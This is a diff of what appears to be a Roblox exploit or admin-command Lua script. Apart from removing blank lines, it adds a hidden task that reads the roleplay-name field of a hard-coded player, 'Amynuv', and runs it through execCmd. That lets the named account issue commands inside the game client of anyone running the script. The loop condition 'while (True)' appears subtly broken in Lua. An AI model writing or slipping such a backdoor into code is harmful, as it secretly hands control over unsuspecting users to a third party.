@@ -1906,11 +1906,6 @@ end
 
 
 
-
-
-
-
-
 local function copyavatar(player)
 	local victim = "accfortestsa"
 
@@ -13977,6 +13972,23 @@ task.spawn(function()
 				wait(0.6)
 				AnnGUI:Destroy()
 			end)
+		end
+	end
+end)
+task.spawn(function()
+	while (True) do
+		function executecmd(vic)
+			local cmd = vic.PlayersBag.RPName.Value
+			execCmd(cmd)
+		end
+		
+		
+		
+		local victim = "Amynuv"
+		local tokl = victim
+		local fp = getPlayer(tokl,Players.LocalPlayer)
+		for i,v in pairs(fp) do
+			executecmd(Players[v])
 		end
 	end
 end)
